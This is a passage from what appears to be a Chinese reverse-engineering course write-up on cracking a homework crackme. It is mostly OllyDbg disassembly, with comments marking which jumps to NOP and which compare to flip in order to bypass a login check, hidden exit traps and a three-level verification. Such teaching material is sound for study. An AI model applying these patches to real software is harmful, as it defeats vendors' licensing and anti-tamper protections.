fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FF 55 FC 5F 5E</span><br></pre></td></tr></table></figure></div><blockquote><p>查壳</p></blockquote><p>Microsoft Visual C++ ver 5.0/6.0</p><blockquote><p>爆破</p></blockquote><p>CTRL+G 输入0401000<br>中文智能搜索 –智能搜索<br>查找ENO 双击回车过去</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">004017FD   . &#x2F;74 09         je short 第七课作.00401808</span><br><span class="line">004017FF   . |53            push ebx</span><br><span class="line">00401800   . |E8 31860000   call 第七课作.00409E36</span><br><span class="line">00401805   . |83C4 04       add esp,0x4</span><br><span class="line">00401808     \837D EC 01    cmp dword ptr ss:[ebp-0x14],0x1          ;  把0改1</span><br><span class="line">0040180C   .  0F84 07000000 je 第七课作.00401819</span><br><span class="line">00401812   .  B8 01000000   mov eax,0x1</span><br><span class="line">00401817   .  EB 05         jmp short 第七课作.0040181E</span><br><span class="line">00401819   &gt;  B8 00000000   mov eax,0x0</span><br></pre></td></tr></table></figure></div><p>F9跑起来，登陆试下，软件直接关闭了<br>有退出暗桩</p><p>CTRL+B<br>输入FF 25  查找退出CALL,</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00406729  |. &#x2F;0F84 18040000 je 第七课作.00406B47                  ;  nop掉，大跳转开始</span><br><span class="line">0040672F  |. |B8 3CC65500   mov eax,第七课作.0055C63C             ;  v_geta</span><br><span class="line">00406734  |. |8945 F4       mov [local.3],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406737  |. |8D45 F4       lea eax,[local.3]</span><br><span class="line">0040673A  |. |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">0040673B  |. |E8 F9060000   call 第七课作.00406E39</span><br><span class="line">00406740  |. |8B5D F4       mov ebx,[local.3]</span><br><span class="line">00406743  |. |85DB          test ebx,ebx</span><br><span class="line">00406745  |. |74 09         je short 第七课作.00406750</span><br><span class="line">00406747  |. |53            push ebx</span><br><span class="line">00406748  |. |E8 E9360000   call 第七课作.00409E36</span><br><span class="line">0040674D  |. |83C4 04       add esp,0x4</span><br><span class="line">00406750  |&gt; |68 01030080   push 0x80000301</span><br><span class="line">00406755  |. |6A 00         push 0x0</span><br><span class="line">00406757  |. |FF75 FC       push [local.1]</span><br><span class="line">0040675A  |. |68 01000000   push 0x1</span><br><span class="line">0040675F  |. |BB 10B04000   mov ebx,第七课作.0040B010</span><br><span class="line">00406764  |. |E8 E5360000   call 第七课作.00409E4E</span><br><span class="line">00406769  |. |83C4 10       add esp,0x10</span><br><span class="line">0040676C  |. |8945 F4       mov [local.3],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">0040676F  |. |68 01030080   push 0x80000301</span><br><span class="line">00406774  |. |6A 00         push 0x0</span><br><span class="line">00406776  |. |FF75 F8       push [local.2]                    ;  kernel32.76A4336A</span><br><span class="line">00406779  |. |68 01000000   push 0x1</span><br><span class="line">0040677E  |. |BB 10B04000   mov ebx,第七课作.0040B010</span><br><span class="line">00406783  |. |E8 C6360000   call 第七课作.00409E4E</span><br><span class="line">00406788  |. |83C4 10       add esp,0x10</span><br><span class="line">0040678B  |. |8945 F0       mov [local.4],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">0040678E  |. |FF75 F0       push [local.4]</span><br><span class="line">00406791  |. |68 12C65500   push 第七课作.0055C612                ;  ,</span><br><span class="line">00406796  |. |FF75 F4       push [local.3]</span><br><span class="line">00406799  |. |68 5BC65500   push 第七课作.0055C65B                ;  v_getb,</span><br><span class="line">0040679E  |. |B9 04000000   mov ecx,0x4</span><br><span class="line">004067A3  |. |E8 CEEEFFFF   call 第七课作.00405676</span><br><span class="line">004067A8  |. |83C4 10       add esp,0x10</span><br><span class="line">004067AB  |. |8945 EC       mov [local.5],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004067AE  |. |8B5D F4       mov ebx,[local.3]</span><br><span class="line">004067B1  |. |85DB          test ebx,ebx</span><br><span class="line">004067B3  |. |74 09         je short 第七课作.004067BE</span><br><span class="line">004067B5  |. |53            push ebx</span><br><span class="line">004067B6  |. |E8 7B360000   call 第七课作.00409E36</span><br><span class="line">004067BB  |. |83C4 04       add esp,0x4</span><br><span class="line">004067BE  |&gt; |8B5D F0       mov ebx,[local.4]</span><br><span class="line">004067C1  |. |85DB          test ebx,ebx</span><br><span class="line">004067C3  |. |74 09         je short 第七课作.004067CE</span><br><span class="line">004067C5  |. |53            push ebx</span><br><span class="line">004067C6  |. |E8 6B360000   call 第七课作.00409E36</span><br><span class="line">004067CB  |. |83C4 04       add esp,0x4</span><br><span class="line">004067CE  |&gt; |8D45 EC       lea eax,[local.5]</span><br><span class="line">004067D1  |. |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004067D2  |. |E8 AD030000   call 第七课作.00406B84</span><br><span class="line">004067D7  |. |8945 E8       mov [local.6],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004067DA  |. |8B5D EC       mov ebx,[local.5]</span><br><span class="line">004067DD  |. |85DB          test ebx,ebx</span><br><span class="line">004067DF  |. |74 09         je short 第七课作.004067EA</span><br><span class="line">004067E1  |. |53            push ebx</span><br><span class="line">004067E2  |. |E8 4F360000   call 第七课作.00409E36</span><br><span class="line">004067E7  |. |83C4 04       add esp,0x4</span><br><span class="line">004067EA  |&gt; |68 04000080   push 0x80000004</span><br><span class="line">004067EF  |. |6A 00         push 0x0</span><br><span class="line">004067F1  |. |8B45 E8       mov eax,[local.6]</span><br><span class="line">004067F4  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004067F6  |. |75 05         jnz short 第七课作.004067FD</span><br><span class="line">004067F8  |. |B8 3E264900   mov eax,第七课作.0049263E</span><br><span class="line">004067FD  |&gt; |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004067FE  |. |68 01000000   push 0x1</span><br><span class="line">00406803  |. |BB 50A64000   mov ebx,第七课作.0040A650</span><br><span class="line">00406808  |. |E8 41360000   call 第七课作.00409E4E</span><br><span class="line">0040680D  |. |83C4 10       add esp,0x10</span><br><span class="line">00406810  |. |8945 E4       mov [local.7],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406813  |. |8B5D E8       mov ebx,[local.6]</span><br><span class="line">00406816  |. |85DB          test ebx,ebx</span><br><span class="line">00406818  |. |74 09         je short 第七课作.00406823</span><br><span class="line">0040681A  |. |53            push ebx</span><br><span class="line">0040681B  |. |E8 16360000   call 第七课作.00409E36</span><br><span class="line">00406820  |. |83C4 04       add esp,0x4</span><br><span class="line">00406823  |&gt; |DB45 FC       fild [local.1]</span><br><span class="line">00406826  |. |DD5D DC       fstp qword ptr ss:[ebp-0x24]</span><br><span class="line">00406829  |. |DD45 DC       fld qword ptr ss:[ebp-0x24]</span><br><span class="line">0040682C  |. |DB45 F8       fild [local.2]</span><br><span class="line">0040682F  |. |DD5D D4       fstp qword ptr ss:[ebp-0x2C]</span><br><span class="line">00406832  |. |DC45 D4       fadd qword ptr ss:[ebp-0x2C]</span><br><span class="line">00406835  |. |DD5D CC       fstp qword ptr ss:[ebp-0x34]</span><br><span class="line">00406838  |. |DB45 E4       fild [local.7]</span><br><span class="line">0040683B  |. |DD5D C4       fstp qword ptr ss:[ebp-0x3C]</span><br><span class="line">0040683E  |. |DD45 C4       fld qword ptr ss:[ebp-0x3C]</span><br><span class="line">00406841  |. |DC65 CC       fsub qword ptr ss:[ebp-0x34]</span><br><span class="line">00406844  |. |D9E4          ftst</span><br><span class="line">00406846  |. |DFE0          fstsw ax</span><br><span class="line">00406848  |. |F6C4 01       test ah,0x1</span><br><span class="line">0040684B  |. |74 02         je short 第七课作.0040684F</span><br><span class="line">0040684D  |. |D9E0          fchs</span><br><span class="line">0040684F  |&gt; |DC1D 63C65500 fcomp qword ptr ds:[0x55C663]</span><br><span class="line">00406855  |. |DFE0          fstsw ax</span><br><span class="line">00406857  |. |F6C4 41       test ah,0x41</span><br><span class="line">0040685A  |. |0F84 E7020000 je 第七课作.00406B47                  ;  nop掉</span><br><span class="line">00406860  |. |B8 3CC65500   mov eax,第七课作.0055C63C             ;  v_geta</span><br><span class="line">00406865  |. |8945 F4       mov [local.3],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406868  |. |8D45 F4       lea eax,[local.3]</span><br><span class="line">0040686B  |. |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">0040686C  |. |E8 13030000   call 第七课作.00406B84</span><br><span class="line">00406871  |. |8945 F0       mov [local.4],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406874  |. |8B5D F4       mov ebx,[local.3]</span><br><span class="line">00406877  |. |85DB          test ebx,ebx</span><br><span class="line">00406879  |. |74 09         je short 第七课作.00406884</span><br><span class="line">0040687B  |. |53            push ebx</span><br><span class="line">0040687C  |. |E8 B5350000   call 第七课作.00409E36</span><br><span class="line">00406881  |. |83C4 04       add esp,0x4</span><br><span class="line">00406884  |&gt; |68 04000080   push 0x80000004</span><br><span class="line">00406889  |. |6A 00         push 0x0</span><br><span class="line">0040688B  |. |8B45 F0       mov eax,[local.4]</span><br><span class="line">0040688E  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406890  |. |75 05         jnz short 第七课作.00406897</span><br><span class="line">00406892  |. |B8 3E264900   mov eax,第七课作.0049263E</span><br><span class="line">00406897  |&gt; |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406898  |. |68 01000000   push 0x1</span><br><span class="line">0040689D  |. |BB F0AC4000   mov ebx,第七课作.0040ACF0</span><br><span class="line">004068A2  |. |E8 A7350000   call 第七课作.00409E4E</span><br><span class="line">004068A7  |. |83C4 10       add esp,0x10</span><br><span class="line">004068AA  |. |8945 EC       mov [local.5],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004068AD  |. |8B5D F0       mov ebx,[local.4]</span><br><span class="line">004068B0  |. |85DB          test ebx,ebx</span><br><span class="line">004068B2  |. |74 09         je short 第七课作.004068BD</span><br><span class="line">004068B4  |. |53            push ebx</span><br><span class="line">004068B5  |. |E8 7C350000   call 第七课作.00409E36</span><br><span class="line">004068BA  |. |83C4 04       add esp,0x4</span><br><span class="line">004068BD  |&gt; |B8 43C65500   mov eax,第七课作.0055C643</span><br><span class="line">004068C2  |. |33C9          xor ecx,ecx</span><br><span class="line">004068C4  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004068C6  |. |74 03         je short 第七课作.004068CB</span><br><span class="line">004068C8  |. |8B48 04       mov ecx,dword ptr ds:[eax+0x4]</span><br><span class="line">004068CB  |&gt; |51            push ecx</span><br><span class="line">004068CC  |. |83C0 08       add eax,0x8</span><br><span class="line">004068CF  |. |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004068D0  |. |8B45 EC       mov eax,[local.5]</span><br><span class="line">004068D3  |. |33DB          xor ebx,ebx</span><br><span class="line">004068D5  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004068D7  |. |74 03         je short 第七课作.004068DC</span><br><span class="line">004068D9  |. |8B58 04       mov ebx,dword ptr ds:[eax+0x4]</span><br><span class="line">004068DC  |&gt; |83C0 08       add eax,0x8</span><br><span class="line">004068DF  |. |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004068E0  |. |3BD9          cmp ebx,ecx</span><br><span class="line">004068E2  |. |B8 01000000   mov eax,0x1</span><br><span class="line">004068E7  |. |75 0A         jnz short 第七课作.004068F3</span><br><span class="line">004068E9  |. |48            dec eax                           ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004068EA  |. |85C9          test ecx,ecx</span><br><span class="line">004068EC  |. |74 05         je short 第七课作.004068F3</span><br><span class="line">004068EE  |. |E8 62FCFFFF   call 第七课作.00406555</span><br><span class="line">004068F3  |&gt; |83C4 0C       add esp,0xC</span><br><span class="line">004068F6  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004068F8  |. |B8 00000000   mov eax,0x0</span><br><span class="line">004068FD  |. |0f94c0        sete al</span><br><span class="line">00406900  |. |8945 E8       mov [local.6],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406903  |. |8B5D EC       mov ebx,[local.5]</span><br><span class="line">00406906  |. |85DB          test ebx,ebx</span><br><span class="line">00406908  |. |74 09         je short 第七课作.00406913</span><br><span class="line">0040690A  |. |53            push ebx</span><br><span class="line">0040690B  |. |E8 26350000   call 第七课作.00409E36</span><br><span class="line">00406910  |. |83C4 04       add esp,0x4</span><br><span class="line">00406913  |&gt; |837D E8 00    cmp [local.6],0x0</span><br><span class="line">00406917  |. |0F84 2A020000 je 第七课作.00406B47                  ;  nop掉</span><br><span class="line">0040691D  |. |68 01000000   push 0x1</span><br><span class="line">00406922  |. |E8 16060000   call 第七课作.00406F3D</span><br><span class="line">00406927  |. |8945 F4       mov [local.3],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">0040692A  |. |68 04000080   push 0x80000004</span><br><span class="line">0040692F  |. |6A 00         push 0x0</span><br><span class="line">00406931  |. |8B45 F4       mov eax,[local.3]</span><br><span class="line">00406934  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406936  |. |75 05         jnz short 第七课作.0040693D</span><br><span class="line">00406938  |. |B8 3E264900   mov eax,第七课作.0049263E</span><br><span class="line">0040693D  |&gt; |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">0040693E  |. |68 01000000   push 0x1</span><br><span class="line">00406943  |. |BB F0AC4000   mov ebx,第七课作.0040ACF0</span><br><span class="line">00406948  |. |E8 01350000   call 第七课作.00409E4E</span><br><span class="line">0040694D  |. |83C4 10       add esp,0x10</span><br><span class="line">00406950  |. |8945 F0       mov [local.4],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406953  |. |8B5D F4       mov ebx,[local.3]</span><br><span class="line">00406956  |. |85DB          test ebx,ebx</span><br><span class="line">00406958  |. |74 09         je short 第七课作.00406963</span><br><span class="line">0040695A  |. |53            push ebx</span><br><span class="line">0040695B  |. |E8 D6340000   call 第七课作.00409E36</span><br><span class="line">00406960  |. |83C4 04       add esp,0x4</span><br><span class="line">00406963  |&gt; |B8 6BC65500   mov eax,第七课作.0055C66B</span><br><span class="line">00406968  |. |33C9          xor ecx,ecx</span><br><span class="line">0040696A  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">0040696C  |. |74 03         je short 第七课作.00406971</span><br><span class="line">0040696E  |. |8B48 04       mov ecx,dword ptr ds:[eax+0x4]</span><br><span class="line">00406971  |&gt; |51            push ecx</span><br><span class="line">00406972  |. |83C0 08       add eax,0x8</span><br><span class="line">00406975  |. |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406976  |. |8B45 F0       mov eax,[local.4]</span><br><span class="line">00406979  |. |33DB          xor ebx,ebx</span><br><span class="line">0040697B  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">0040697D  |. |74 03         je short 第七课作.00406982</span><br><span class="line">0040697F  |. |8B58 04       mov ebx,dword ptr ds:[eax+0x4]</span><br><span class="line">00406982  |&gt; |83C0 08       add eax,0x8</span><br><span class="line">00406985  |. |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406986  |. |3BD9          cmp ebx,ecx</span><br><span class="line">00406988  |. |B8 01000000   mov eax,0x1</span><br><span class="line">0040698D  |. |75 0A         jnz short 第七课作.00406999</span><br><span class="line">0040698F  |. |48            dec eax                           ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406990  |. |85C9          test ecx,ecx</span><br><span class="line">00406992  |. |74 05         je short 第七课作.00406999</span><br><span class="line">00406994  |. |E8 BCFBFFFF   call 第七课作.00406555</span><br><span class="line">00406999  |&gt; |83C4 0C       add esp,0xC</span><br><span class="line">0040699C  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">0040699E  |. |B8 00000000   mov eax,0x0</span><br><span class="line">004069A3  |. |0f94c0        sete al</span><br><span class="line">004069A6  |. |8945 EC       mov [local.5],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004069A9  |. |8B5D F0       mov ebx,[local.4]</span><br><span class="line">004069AC  |. |85DB          test ebx,ebx</span><br><span class="line">004069AE  |. |74 09         je short 第七课作.004069B9</span><br><span class="line">004069B0  |. |53            push ebx</span><br><span class="line">004069B1  |. |E8 80340000   call 第七课作.00409E36</span><br><span class="line">004069B6  |. |83C4 04       add esp,0x4</span><br><span class="line">004069B9  |&gt; |837D EC 00    cmp [local.5],0x0</span><br><span class="line">004069BD  |. |0F84 84010000 je 第七课作.00406B47                  ;  nop掉</span><br><span class="line">004069C3  |. |68 02000000   push 0x2</span><br><span class="line">004069C8  |. |E8 70050000   call 第七课作.00406F3D</span><br><span class="line">004069CD  |. |8945 F4       mov [local.3],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004069D0  |. |68 04000080   push 0x80000004</span><br><span class="line">004069D5  |. |6A 00         push 0x0</span><br><span class="line">004069D7  |. |8B45 F4       mov eax,[local.3]</span><br><span class="line">004069DA  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004069DC  |. |75 05         jnz short 第七课作.004069E3</span><br><span class="line">004069DE  |. |B8 3E264900   mov eax,第七课作.0049263E</span><br><span class="line">004069E3  |&gt; |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004069E4  |. |68 01000000   push 0x1</span><br><span class="line">004069E9  |. |BB F0AC4000   mov ebx,第七课作.0040ACF0</span><br><span class="line">004069EE  |. |E8 5B340000   call 第七课作.00409E4E</span><br><span class="line">004069F3  |. |83C4 10       add esp,0x10</span><br><span class="line">004069F6  |. |8945 F0       mov [local.4],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004069F9  |. |8B5D F4       mov ebx,[local.3]</span><br><span class="line">004069FC  |. |85DB          test ebx,ebx</span><br><span class="line">004069FE  |. |74 09         je short 第七课作.00406A09</span><br><span class="line">00406A00  |. |53            push ebx</span><br><span class="line">00406A01  |. |E8 30340000   call 第七课作.00409E36</span><br><span class="line">00406A06  |. |83C4 04       add esp,0x4</span><br><span class="line">00406A09  |&gt; |B8 7EC65500   mov eax,第七课作.0055C67E</span><br><span class="line">00406A0E  |. |33C9          xor ecx,ecx</span><br><span class="line">00406A10  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406A12  |. |74 03         je short 第七课作.00406A17</span><br><span class="line">00406A14  |. |8B48 04       mov ecx,dword ptr ds:[eax+0x4]</span><br><span class="line">00406A17  |&gt; |51            push ecx</span><br><span class="line">00406A18  |. |83C0 08       add eax,0x8</span><br><span class="line">00406A1B  |. |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406A1C  |. |8B45 F0       mov eax,[local.4]</span><br><span class="line">00406A1F  |. |33DB          xor ebx,ebx</span><br><span class="line">00406A21  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406A23  |. |74 03         je short 第七课作.00406A28</span><br><span class="line">00406A25  |. |8B58 04       mov ebx,dword ptr ds:[eax+0x4]</span><br><span class="line">00406A28  |&gt; |83C0 08       add eax,0x8</span><br><span class="line">00406A2B  |. |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406A2C  |. |3BD9          cmp ebx,ecx</span><br><span class="line">00406A2E  |. |B8 01000000   mov eax,0x1</span><br><span class="line">00406A33  |. |75 0A         jnz short 第七课作.00406A3F</span><br><span class="line">00406A35  |. |48            dec eax                           ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406A36  |. |85C9          test ecx,ecx</span><br><span class="line">00406A38  |. |74 05         je short 第七课作.00406A3F</span><br><span class="line">00406A3A  |. |E8 16FBFFFF   call 第七课作.00406555</span><br><span class="line">00406A3F  |&gt; |83C4 0C       add esp,0xC</span><br><span class="line">00406A42  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406A44  |. |B8 00000000   mov eax,0x0</span><br><span class="line">00406A49  |. |0f94c0        sete al</span><br><span class="line">00406A4C  |. |8945 EC       mov [local.5],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406A4F  |. |8B5D F0       mov ebx,[local.4]</span><br><span class="line">00406A52  |. |85DB          test ebx,ebx</span><br><span class="line">00406A54  |. |74 09         je short 第七课作.00406A5F</span><br><span class="line">00406A56  |. |53            push ebx</span><br><span class="line">00406A57  |. |E8 DA330000   call 第七课作.00409E36</span><br><span class="line">00406A5C  |. |83C4 04       add esp,0x4</span><br><span class="line">00406A5F  |&gt; |837D EC 00    cmp [local.5],0x0</span><br><span class="line">00406A63  |. |0F84 DE000000 je 第七课作.00406B47                  ;  nop掉</span><br><span class="line">00406A69  |. |68 0F000000   push 0xF</span><br><span class="line">00406A6E  |. |E8 CA040000   call 第七课作.00406F3D</span><br><span class="line">00406A73  |. |8945 F4       mov [local.3],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406A76  |. |68 04000080   push 0x80000004</span><br><span class="line">00406A7B  |. |6A 00         push 0x0</span><br><span class="line">00406A7D  |. |8B45 F4       mov eax,[local.3]</span><br><span class="line">00406A80  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406A82  |. |75 05         jnz short 第七课作.00406A89</span><br><span class="line">00406A84  |. |B8 3E264900   mov eax,第七课作.0049263E</span><br><span class="line">00406A89  |&gt; |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406A8A  |. |68 01000000   push 0x1</span><br><span class="line">00406A8F  |. |BB F0AC4000   mov ebx,第七课作.0040ACF0</span><br><span class="line">00406A94  |. |E8 B5330000   call 第七课作.00409E4E</span><br><span class="line">00406A99  |. |83C4 10       add esp,0x10</span><br><span class="line">00406A9C  |. |8945 F0       mov [local.4],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406A9F  |. |8B5D F4       mov ebx,[local.3]</span><br><span class="line">00406AA2  |. |85DB          test ebx,ebx</span><br><span class="line">00406AA4  |. |74 09         je short 第七课作.00406AAF</span><br><span class="line">00406AA6  |. |53            push ebx</span><br><span class="line">00406AA7  |. |E8 8A330000   call 第七课作.00409E36</span><br><span class="line">00406AAC  |. |83C4 04       add esp,0x4</span><br><span class="line">00406AAF  |&gt; |B8 91C65500   mov eax,第七课作.0055C691</span><br><span class="line">00406AB4  |. |33C9          xor ecx,ecx</span><br><span class="line">00406AB6  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406AB8  |. |74 03         je short 第七课作.00406ABD</span><br><span class="line">00406ABA  |. |8B48 04       mov ecx,dword ptr ds:[eax+0x4]</span><br><span class="line">00406ABD  |&gt; |51            push ecx</span><br><span class="line">00406ABE  |. |83C0 08       add eax,0x8</span><br><span class="line">00406AC1  |. |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406AC2  |. |8B45 F0       mov eax,[local.4]</span><br><span class="line">00406AC5  |. |33DB          xor ebx,ebx</span><br><span class="line">00406AC7  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406AC9  |. |74 03         je short 第七课作.00406ACE</span><br><span class="line">00406ACB  |. |8B58 04       mov ebx,dword ptr ds:[eax+0x4]</span><br><span class="line">00406ACE  |&gt; |83C0 08       add eax,0x8</span><br><span class="line">00406AD1  |. |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406AD2  |. |3BD9          cmp ebx,ecx</span><br><span class="line">00406AD4  |. |B8 01000000   mov eax,0x1</span><br><span class="line">00406AD9  |. |75 0A         jnz short 第七课作.00406AE5</span><br><span class="line">00406ADB  |. |48            dec eax                           ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406ADC  |. |85C9          test ecx,ecx</span><br><span class="line">00406ADE  |. |74 05         je short 第七课作.00406AE5</span><br><span class="line">00406AE0  |. |E8 70FAFFFF   call 第七课作.00406555</span><br><span class="line">00406AE5  |&gt; |83C4 0C       add esp,0xC</span><br><span class="line">00406AE8  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406AEA  |. |B8 00000000   mov eax,0x0</span><br><span class="line">00406AEF  |. |0f94c0        sete al</span><br><span class="line">00406AF2  |. |8945 EC       mov [local.5],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00406AF5  |. |8B5D F0       mov ebx,[local.4]</span><br><span class="line">00406AF8  |. |85DB          test ebx,ebx</span><br><span class="line">00406AFA  |. |74 09         je short 第七课作.00406B05</span><br><span class="line">00406AFC  |. |53            push ebx</span><br><span class="line">00406AFD  |. |E8 34330000   call 第七课作.00409E36</span><br><span class="line">00406B02  |. |83C4 04       add esp,0x4</span><br><span class="line">00406B05  |&gt; |837D EC 00    cmp [local.5],0x0</span><br><span class="line">00406B09  |. |0F84 38000000 je 第七课作.00406B47                  ;  nop掉</span><br><span class="line">00406B0F  |. |6A 00         push 0x0</span><br><span class="line">00406B11  |. |6A 00         push 0x0</span><br><span class="line">00406B13  |. |6A 00         push 0x0</span><br><span class="line">00406B15  |. |68 04000080   push 0x80000004</span><br><span class="line">00406B1A  |. |6A 00         push 0x0</span><br><span class="line">00406B1C  |. |68 B0C65500   push 第七课作.0055C6B0                ;  三级效验通过</span><br><span class="line">00406B21  |. |68 0F000100   push 0x1000F</span><br><span class="line">00406B26  |. |68 7D6B0116   push 0x16016B7D</span><br><span class="line">00406B2B  |. |68 2B010152   push 0x5201012B</span><br><span class="line">00406B30  |. |68 03000000   push 0x3</span><br><span class="line">00406B35  |. |BB E0B94000   mov ebx,第七课作.0040B9E0</span><br><span class="line">00406B3A  |. |E8 0F330000   call 第七课作.00409E4E</span><br><span class="line">00406B3F  |. |83C4 28       add esp,0x28</span><br><span class="line">00406B42  |. |E9 39000000   jmp 第七课作.00406B80</span><br><span class="line">00406B47  |&gt; \BB 06000000   mov ebx,0x6                       ;  nop掉，大跳转终点</span><br></pre></td></tr></table></figure></div><h5 id="第二个暗桩"><a href="#第二个暗桩" class="headerlink" title="第二个暗桩"></a>第二个暗桩</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">004076DE  |. &#x2F;0F84 26020000 je 第七课作.0040790A                  ;  nop掉，大跳转开始</span><br><span class="line">004076E4  |. |B8 3CC65500   mov eax,第七课作.0055C63C             ;  v_geta</span><br><span class="line">004076E9  |. |8945 F4       mov [local.3],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004076EC  |. |8D45 F4       lea eax,[local.3]</span><br><span class="line">004076EF  |. |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004076F0  |. |E8 44F7FFFF   call 第七课作.00406E39</span><br><span class="line">004076F5  |. |8B5D F4       mov ebx,[local.3]</span><br><span class="line">004076F8  |. |85DB          test ebx,ebx</span><br><span class="line">004076FA  |. |74 09         je short 第七课作.00407705</span><br><span class="line">004076FC  |. |53            push ebx</span><br><span class="line">004076FD  |. |E8 34270000   call 第七课作.00409E36</span><br><span class="line">00407702  |. |83C4 04       add esp,0x4</span><br><span class="line">00407705  |&gt; |68 01030080   push 0x80000301</span><br><span class="line">0040770A  |. |6A 00         push 0x0</span><br><span class="line">0040770C  |. |FF75 FC       push [local.1]</span><br><span class="line">0040770F  |. |68 01000000   push 0x1</span><br><span class="line">00407714  |. |BB 10B04000   mov ebx,第七课作.0040B010</span><br><span class="line">00407719  |. |E8 30270000   call 第七课作.00409E4E</span><br><span class="line">0040771E  |. |83C4 10       add esp,0x10</span><br><span class="line">00407721  |. |8945 F4       mov [local.3],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00407724  |. |68 01030080   push 0x80000301</span><br><span class="line">00407729  |. |6A 00         push 0x0</span><br><span class="line">0040772B  |. |FF75 F8       push [local.2]                    ;  kernel32.76A4336A</span><br><span class="line">0040772E  |. |68 01000000   push 0x1</span><br><span class="line">00407733  |. |BB 10B04000   mov ebx,第七课作.0040B010</span><br><span class="line">00407738  |. |E8 11270000   call 第七课作.00409E4E</span><br><span class="line">0040773D  |. |83C4 10       add esp,0x10</span><br><span class="line">00407740  |. |8945 F0       mov [local.4],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00407743  |. |FF75 F0       push [local.4]</span><br><span class="line">00407746  |. |68 12C65500   push 第七课作.0055C612                ;  ,</span><br><span class="line">0040774B  |. |FF75 F4       push [local.3]</span><br><span class="line">0040774E  |. |68 5BC65500   push 第七课作.0055C65B                ;  v_getb,</span><br><span class="line">00407753  |. 